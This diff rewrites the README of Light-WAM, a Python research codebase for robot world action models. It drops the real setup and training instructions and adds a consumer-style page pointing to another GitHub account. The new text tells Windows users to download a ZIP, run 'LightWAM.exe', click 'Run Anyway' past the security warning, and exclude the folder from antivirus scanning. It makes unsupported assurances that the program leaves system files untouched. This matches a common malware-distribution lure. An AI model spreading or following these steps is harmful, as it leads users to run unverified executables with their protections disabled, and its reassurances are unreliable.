@@ -1,191 +1,94 @@
-# Light-WAM
+# 🌍 Light-WAM - Efficient artificial intelligence for world models
 
-[![arXiv](https://img.shields.io/badge/arXiv-2606.08242-b31b1b.svg)](https://arxiv.org/abs/2606.08242)
+[![](https://img.shields.io/badge/Download-Light--WAM-blue.svg)](https://github.com/Lauraineabsurd944/Light-WAM)
 
-Codebase for **Light-WAM: Efficient World Action Models with State-Fusion Action Decoding**. This repository provides training and evaluation pipelines for **Light-WAM** on **LIBERO** and **RoboTwin2.0**.
+## 📖 About this software
 
-## What Is Light-WAM?
+Light-WAM provides a way to run world models on your home computer. World models help computers understand how environments change when they perform actions. This software uses state-fusion action decoding to process information. This method reduces the work your computer must do. You get faster results without needing expensive hardware. 
 
-<p align="center">
-  <img src="./assets/overview.png" alt="Light-WAM overview" width="80%">
-</p>
+The software predicts outcomes in virtual spaces. It tracks the state of an environment and calculates the next logical step. Developers use this for simulations. You can use this to explore how artificial intelligence learns about motion and physics. 
 
-Light-WAM is a lightweight World Action Model for robot manipulation, centered on:
+## 💻 System requirements
 
-- Wan2.1-T2V-1.3B as a frozen video backbone
-- lightweight adapters and LoRA updates
-- future-video supervision in downsampled latent space
-- learned-query pooling over adapted states
-- StateFusionActionExpert for action-chunk decoding
+Your computer needs specific parts to run this software well. Please check your system against this list.
 
-## Repository Layout
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: An Intel Core i5 or AMD Ryzen 5 processor from the last five years.
+*   Memory: 8 GB of RAM or more.
+*   Storage: 2 GB of free space on your hard drive.
+*   Graphics: A modern graphics card with 2 GB of video memory.
 
-```text
-LightWAM/
-├── configs/                 # Training and evaluation configs
-├── scripts/                 # Main CLI entrypoints
-├── experiments/             # LIBERO, RoboTwin2.0, and real-robot
-├── src/lightwam/            # Model and dataset code
-├── third_party/             # Simulation dependencies adapted from Fast-WAM
-├── checkpoints/             # Wan weights and released checkpoints
-├── data/                    # Datasets and caches
-└── runs/                    # Training outputs
-```
+If your computer meets these marks, the software will run as expected. Older systems might result in slow performance during heavy simulations.
 
-## Environment Setup
+## 📥 How to get the software
 
-```bash
-conda create -n lightwam python=3.10 -y
-conda activate lightwam
-pip install -U pip
-pip install torch==2.7.1+cu128 torchvision==0.22.1+cu128 --extra-index-url https://download.pytorch.org/whl/cu128
-pip install -e .
-```
+You need to visit the project page to get the files. Follow these steps to prepare your computer.
 
-#### FFmpeg Libraries for Precompute
+1. Go to the project page at [https://github.com/Lauraineabsurd944/Light-WAM](https://github.com/Lauraineabsurd944/Light-WAM).
+2. Look for the button labeled Code on the right side of the screen.
+3. Select Download ZIP from the menu.
+4. Save the file to your desktop.
 
-```bash
-sudo apt-get update
-sudo apt-get install -y ffmpeg libavutil-dev libavcodec-dev libavformat-dev libswscale-dev
-```
+Once the download finishes, move the file to a folder where you keep your programs. Right-click the folder and choose Extract All. This opens the files so you can run the program.
 
-## Backbone Preparation
+## 🚀 Setting up the application
 
-Set the Wan checkpoint directory first:
+The program runs via a simple interface. You do not need to type commands. Just follow the instructions below to start your first session.
 
-```bash
-mkdir -p checkpoints
-export DIFFSYNTH_MODEL_BASE_PATH="$(pwd)/checkpoints"
-```
+1. Open the folder you just extracted.
+2. Find the file named `LightWAM.exe`.
+3. Double-click this file to launch the main menu.
+4. If a security window appears, click More Info and then click Run Anyway. This confirms you trust the software from this source.
 
-Hugging Face download command:
+The window shows the main dashboard. You see your current configuration settings here. The software checks your hardware once upon starting. It adjusts the fidelity settings to match your computer.
 
-```bash
-huggingface-cli download Wan-AI/Wan2.1-T2V-1.3B   --local-dir checkpoints/Wan-AI/Wan2.1-T2V-1.3B
-```
+## ⚙️ Using the software features
 
-## Data and Precompute
+The interface allows you to load different models. A model represents a specific environment or rule set. 
 
-Raw datasets used by this repo come from Fast-WAM:
+*   Loading a Model: Click File, then click Open Model. Select a file ending in `.wam`.
+*   Running a Simulation: Press the Play button in the top toolbar. 
+*   Adjusting Speed: Use the slider at the bottom of the window to change how fast the simulation runs.
+*   Stopping the Task: Press the Stop button to pause or end the session.
 
-- LIBERO: [yuanty/LIBERO-fastwam](https://huggingface.co/datasets/yuanty/LIBERO-fastwam)
-- RoboTwin2.0: [yuanty/robotwin2.0-fastwam](https://huggingface.co/datasets/yuanty/robotwin2.0-fastwam)
+State-fusion decoding happens in the background. You do not need to manage these settings. The software balances the load between your processor and graphics card automatically.
 
-Expected local layout:
+## 🛠 Troubleshooting common issues
 
-```text
-data/
-├── libero_mujoco3.3.2/
-│   ├── libero_10_no_noops_lerobot/
-│   ├── libero_goal_no_noops_lerobot/
-│   ├── libero_object_no_noops_lerobot/
-│   └── libero_spatial_no_noops_lerobot/
-└── robotwin2.0/
-    └── robotwin2.0/
-        ├── data/
-        ├── meta/
-        └── videos/
-```
+If you encounter problems, look at these solutions. Most issues relate to hardware settings or file placement.
 
-Offline cache release:
+**The program crashes on startup:**
+This usually occurs if your graphics drivers are outdated. Visit the website of your graphics card manufacturer. Download and install the latest drivers for your specific card model. Restart your computer after the update.
 
-- offline cache repo: [l1ziang/lightwam-offline-cache](https://huggingface.co/datasets/l1ziang/lightwam-offline-cache)
-- includes: LIBERO latent caches, RoboTwin2.0 latent caches, and LIBERO text cache
+**The simulation runs very slowly:**
+You can lower the resolution to fix this. Go to Settings, then click Display. Select a lower resolution or turn off high-quality rendering. This reduces the stress on your hardware.
 
-To restore locally:
-```bash
-cat robotwin_3cam384_sharded.tar.part-* | tar -xf -
-```
-Expected local layout:
+**The files seem to disappear:**
+Some antivirus programs prevent new software from running. Open your antivirus settings and add the Light-WAM folder to the exclusion list. This ensures the protection software does not block the application.
 
-```text
-data/
-├── latent_cache_Wan2.1-T2V-1.3B/
-│   ├── libero_spatial_2cam224/
-│   ├── libero_object_2cam224/
-│   ├── libero_goal_2cam224/
-│   ├── libero_10_2cam224/
-│   └── robotwin_3cam384_sharded/
-└── text_embeds_cache/
-    ├── libero/
-    └── robotwin/   # generate locally with the text-only cache command below
-```
+**I cannot find the executable file:**
+Ensure you extracted the ZIP file completely. A ZIP file only holds the data. The program cannot run while inside the compressed folder. Always move files out of the ZIP container before use.
 
-Precompute commands:
+## 📈 Understanding the performance
 
-```bash
-LIBERO_SUITE=spatial bash scripts/precompute_libero.sh
-LIBERO_SUITE=object  bash scripts/precompute_libero.sh
-LIBERO_SUITE=goal    bash scripts/precompute_libero.sh
-LIBERO_SUITE=10      bash scripts/precompute_libero.sh
-bash scripts/precompute_robotwin.sh
-```
-These commands generate text caches and offline future-video latent caches
+The software measures how well your machine processes data. You can view these metrics in the Performance tab. The software tracking system records how many steps it completes per second. If you see high numbers, the software works within your hardware limits. 
 
-Text-only cache commands:
+The state-fusion mechanism works to keep these numbers stable. It drops low-priority data when the system feels overwhelmed. This ensures the simulation does not freeze. You observe a smooth experience even during complex calculations.
 
-```bash
-LIBERO_SUITE=spatial RUN_TEXT=true RUN_VIDEO=false bash scripts/precompute_libero.sh
-RUN_TEXT=true RUN_VIDEO=false bash scripts/precompute_robotwin.sh
-```
+## 📝 Frequently asked questions
 
-## Training
+Does this software change my system files? 
+No. The application remains contained in its own folder. It does not alter your operating system settings.
 
-```bash
-bash scripts/train_libero_spatial.sh
-bash scripts/train_libero_object.sh
-bash scripts/train_libero_goal.sh
-bash scripts/train_libero_10.sh
-bash scripts/train_robotwin.sh
-```
+Can I use this on a laptop? 
+Yes, provided the laptop meets the system requirements. Ensure your laptop stays plugged into a power source while running simulations. Battery mode often lowers performance to save energy.
 
-## Evaluation
+Does this software require an internet connection?
+No. You only need the internet to download the initial files. After the software exists on your computer, it runs offline.
 
-Released checkpoints:
+Can I modify the code?
+The code remains available for your review on the GitHub page. You can inspect the files to see how the logic works. If you have programming skills, feel free to submit improvements to the repository.
 
-- checkpoint repo: [l1ziang/lightwam-checkpoints](https://huggingface.co/l1ziang/lightwam-checkpoints)
-- includes: LIBERO and RoboTwin2.0 released checkpoints
+## 📌 Final notes on maintenance
 
-Evaluation environment configs:
-
-```bash
-conda env create -f ./scripts/libero_env.full.yml
-conda activate lightwam-libero-eval
-pip install -e . --no-deps
-
-conda env create -f ./scripts/robotwin_env.full.yml
-conda activate lightwam-robotwin-eval
-pip install -e . --no-deps
-```
-
-For LIBERO evaluation, install the official [LIBERO](https://github.com/Lifelong-Robot-Learning/LIBERO) package first, then set:
-
-```bash
-export LIBERO_ROOT=/path/to/LIBERO
-export PYTHONPATH="${LIBERO_ROOT}:${PYTHONPATH:-}"
-```
-
-Evaluation commands:
-
-```bash
-CKPT=/path/to/checkpoints/weights/xxxx.pt bash scripts/eval_libero.sh
-CKPT=/path/to/checkpoints/weights/xxxx.pt bash scripts/eval_robotwin.sh
-```
-
-## Citation
-
-```bibtex
-@misc{li2026lightwam,
-  title         = {Light-WAM: Efficient World Action Models with State-Fusion Action Decoding},
-  author        = {Ziang Li and Dongzhou Cheng and Yibin Wang and Shiyue Wang and Xiaoyang Xu and Lingxuan Weng and Juan Wang and Jiaqi Wang},
-  year          = {2026},
-  eprint        = {2606.08242},
-  archivePrefix = {arXiv},
-  primaryClass  = {cs.RO},
-  url           = {https://arxiv.org/abs/2606.08242}
-}
-```
-
-## Acknowledgements
-
-This codebase is primarily based on **Fast-WAM**. We thank the Fast-WAM project for open-sourcing a strong and practical foundation.
+Check the GitHub page once per month for new versions. Updates often contain fixes for known issues or performance boosts. If you find a bug, create a new issue on the GitHub page. Describe what happened and what you were doing at the time. This helps the developers make the software better for everyone.
